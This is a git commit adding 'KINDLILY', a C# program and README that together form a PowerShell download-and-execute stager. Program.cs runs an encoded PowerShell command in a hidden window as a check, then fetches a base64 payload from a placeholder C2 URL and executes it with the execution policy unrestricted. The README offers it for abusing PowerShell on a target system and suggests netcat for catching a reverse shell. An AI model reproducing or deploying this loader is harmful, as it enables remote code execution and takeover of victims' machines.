2bc07ea33e0c72486353d66643e1673b3c1d3231
Perpetually Learning <54043553+nins3i@users.noreply.github.com>
2020-06-04 20:53:10 -0500

    Initial commit.

---
+++ Program.cs
@@ -0,0 +1,52 @@
+﻿using System;
+using System.IO;
+using System.Threading;
+using System.Net;
+
+internal class MainApp
+{
+
+    public static void Main()
+    {
+
+        //encoded ps command to create test file "testfile1.txt" in the %temp% path
+        _ = System.Diagnostics.Process.Start("powershell.exe", " -noP -sta -w 1 -exec unrestricted -enc JABhAD0AKABnAGUAdAAtAGkAdABlAG0AIABlAG4AdgA6AHQAZQBtAHAAKQAuAHYAYQBsAHUAZQA7AE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAYQAgAC0ATgBhAG0AZQAgACIAdABlAHMAdABmAGkAbABlADEALgB0AHgAdAAiACAALQBJAHQAZQBtAFQAeQBwAGUAIAAiAGYAaQBsAGUAIgAgAC0AVgBhAGwAdQBlACAAIgBUAGgAaQBzACAAaQBzACAAYQAgAHQAZQB4AHQAIABzAHQAcgBpAG4AZwAuACIA");
+
+        //give the powershell command time to create the file
+        Thread.Sleep(500);
+
+        string v = Environment.GetEnvironmentVariable("temp");
+        string tempPath = v;
+        string curFile = tempPath + @"\testfile1.txt";
+
+        //check if powershell works
+        if (File.Exists(curFile))
+            KindLily();
+        else
+        {
+            //Console.WriteLine("File does not exist.");
+        }
+
+        //Console.WriteLine("Press enter key to continue");
+        //Console.ReadLine();
+
+    }
+
+    private static void KindLily()
+    {
+
+        //Console.WriteLine("<C2 URL hosting a base64 encoded payload as a .txt file.>");
+        WebRequest request = WebRequest.Create("c2domain.com/c2/b64encodedpayload.txt");
+        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+        //Console.WriteLine (response.StatusDescription);
+        Stream dataStream = response.GetResponseStream();
+        StreamReader reader = new StreamReader(dataStream);
+        string responseFromServer = reader.ReadToEnd();
+        responseFromServer = responseFromServer.Replace("%", "W");
+        //Console.WriteLine (responseFromServer);
+        System.Diagnostics.Process.Start("powershell.exe", " -noP -sta -w 1 -exec unrestricted -enc " + responseFromServer);
+        reader.Close();
+        dataStream.Close();
+        response.Close();
+    }
+}
---
+++ README.md
@@ -0,0 +1,21 @@
+﻿# KINDLILY
+
+For when you know there is Powershell, and want to abuse it
+Take a gander inside Program.cs and update the URL relevant
+To your own C2 domain.
+
+At that domain, have available a base64 encoded payload within
+A .txt that you wish to execute on the target system.
+
+
+Compile for the required windows version encountered.
+
+Personally, netcat works well for receiving a reverse
+Shell.
+
+Million ways to hack a fish
+
+# Dependencies
+
+Recently started with C#. Eventually plan on making payloads
+that take advante of platform invocation. 
